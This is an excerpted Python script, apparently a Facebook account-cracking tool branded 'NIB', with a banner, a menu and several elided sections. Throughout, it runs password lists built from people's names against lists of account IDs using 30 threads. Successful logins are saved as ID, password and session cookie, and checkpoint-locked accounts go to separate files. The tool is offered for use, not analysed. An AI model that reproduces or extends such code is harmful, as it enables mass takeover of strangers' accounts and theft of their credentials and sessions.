...
\x1b[1;92m
--------------------------------------------------
 \033[1;37m[+] Owner : Khairoo xxv
 [+] Facebook : Khairoo xxv 
 [+] Tool : FREE
 [+]  Version: 0.4
\x1b[1;92m--------------------------------------------------""")
...
def Main_Menu():
		...
		linex()
		NIB= input('\033[1;37m [+] Select option: ')
		if NIB =='1':
			file_crack()
		elif NIB =='2':
			r_crack()
...
def file_crack():
	...
	with tred(max_workers=30) as NIB:
		os.system('clear')
		print(logo)
		tl = str(len(fo))
		print(' Total Idz : \033[1;97m'+tl)
		print('\33[1;37m Sabar Kar Bharway \033[1;97m')
		print('\033[1;37m USE JAHAZ AFTER 40 SECONDS')
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if mthd in ['1','01']:
				NIB.submit(api1,ids,names,passlist)
			elif mthd in ['2','02']:
				NIB.submit(api2,ids,names,passlist)
			else:
				Main_Menu()
	print('\033[1;37m')
	linex()
...
def gmail():
	...
	clear()
	print('\033[1;37m Example: \033[1;32m NIB, Ali, Ahmed, Hamza\033[1;97m')
	linex()
	...
	try:
		...
		for pas in passlist:
			...
			if 'session_key' in po:
				...
				if 'LIVE' in get_req:
					print('\r\r\033[1;32m [NIB-OK] ' + uid + ' | ' + pas)
					print(' \33[1;33m[Cookies🍪] : ' + cookie)
					open('/sdcard/NIB/NIB-Mail-OK.txt', 'a').write(uid + '|' + pas + '\n')
					open('/sdcard/NIB/NIB-Mail-OK-COOKIE.txt', 'a').write(uid + '|' + pas + '|' + cookie + '\n')
					oks.append(uid)
					break
				if 'DEAD' in get_req:
				...
				print('\r\033[1;91m [NIB-CP] ' + uid + ' | ' + pas + '\033[1;97m')
				file_path = os.path.join(folder_path, 'NIB-CP.txt')
		...
		for pas in passlist:
			...
			if 'session_key' in po:
					...
					if 'LIVE' in get_req:
						print('\r\r\033[1;32m [NIB-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies🍪] : '+cookie)
						open('/sdcard/NIB/NIB-RANDOM-OK.txt','a').write(uid+'|'+pas+'\n')
						open('/sdcard/NIB/NIB-RANDOM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
						oks.append(uid)
						break
					if 'DEAD' in get_req:
						#print('\r\033[1;91m [LOCK] '+uid+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m[NIB-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					open('/sdcard/NIB/NIB-FILE-OK.txt','a').write(uid+'|'+pas+'\n')
					open('/sdcard/NIB/NIB-FILE-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
...
def api2(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m[NIB-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					uid = str(po['error']['error_data']['uid'])
					#print('\r\033[1;91m [NIB-CP] '+uid+' × '+pas+'\033[1;97m')
					open('/sdcard/NIB/NIB-CP.txt','a').write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
			else:
				continue
